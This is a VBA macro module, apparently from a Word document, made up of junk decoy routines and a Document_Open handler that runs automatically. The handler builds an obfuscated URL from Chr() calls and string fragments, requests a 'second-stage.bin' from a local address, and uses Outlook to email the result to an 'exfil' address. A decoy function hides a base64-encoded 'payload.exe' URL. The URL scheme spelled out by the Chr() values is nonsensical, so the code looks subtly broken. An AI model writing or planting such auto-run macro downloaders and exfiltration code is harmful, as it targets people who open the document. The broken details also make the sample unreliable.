
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim frs0swbone As Object, url As String
    Dim bwt1msm67xb As Object, pj16ga84d1wp As Object
    On Error Resume Next
    url = Chr(102) & Chr(114) & Chr(115) & Chr(48) & Chr(115) & Chr(119) & Chr(98) & Chr(111) & "ne://12" & "7.0." & "0.1:9" & "090/secon" & "d-stag" & "e.bi" & "n"
    Set frs0swbone = CreateObject("MSXM" & "L2.XMLHT" & "TP")
    frs0swbone.Open "GET", url, False
    frs0swbone.Send
    Set bwt1msm67xb = CreateObject("Outlook" & ".Applicat" & "ion")
    Set pj16ga84d1wp = bwt1msm67xb.CreateItem(0)
    pj16ga84d1wp.To = "exfil@example.com"
    pj16ga84d1wp.Subject = "logs"
    pj16ga84d1wp.Body = frs0swbone.Status
    pj16ga84d1wp.Send
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
